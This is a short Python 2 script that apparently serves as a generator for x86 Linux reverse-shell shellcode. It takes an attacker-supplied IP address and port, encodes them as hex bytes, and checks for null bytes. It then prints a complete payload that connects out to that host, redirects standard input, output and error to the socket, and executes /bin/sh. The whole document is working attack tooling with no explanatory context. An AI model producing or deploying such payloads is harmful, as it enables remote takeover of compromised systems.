import sys

byte_string = ""
counter = 0
result_port = ""
result_ip = ""

if (len(sys.argv) < 2):
    print "Enter the IP address and port number"
else:
    ip = sys.argv[1]
    ip_array = ip.split('.')
    for i in ip_array:
        hex_ip = hex(int(i))[2:]
        result_ip += "\\x" + hex_ip
    port = int(sys.argv[2])
    if ((port < 1) or (port > 65535)):
        print "Enter valid port number:"
    else:
        hex_port = hex(port)[2:]
        for i in hex_port:
            byte_string += i
            counter += 1
            if counter == 2:
                result_port += "\\x" + byte_string
                byte_string = ""
                counter = 0
        if "\\x0" in result_port:
            print "Shellcode contains null bytes! Choose another port"
        elif "\\x0" in result_ip:
            print "Shellcode contains null bytes! Choose another IP address"
        else:
            print result_ip
            print result_port
            print ("\\x6a\\x66\\x58\\x31\\xd2\\x31\\xdb\\x43\\x52\\x53\\x6a"
            "\\x02\\x89\\xe1\\xcd\\x80\\x92\\x6a\\x66\\x58\\x68" + result_ip +
            "\\x66\\x68" + result_port + "\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51"
            "\\x52\\x89\\xe1\\x43\\xcd\\x80\\x87\\xda\\xb0\\x3f\\x31\\xc9\\xcd"
            "\\x80\\xb0\\x3f\\x41\\xcd\\x80\\xb0\\x3f\\x41\\xcd\\x80\\xb0\\x0b"
            "\\x31\\xd2\\x31\\xc9\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62"
            "\\x69\\x6e\\x89\\xe3\\x52\\x89\\xe2\\x53\\x89\\xe1\\xcd\\x80")
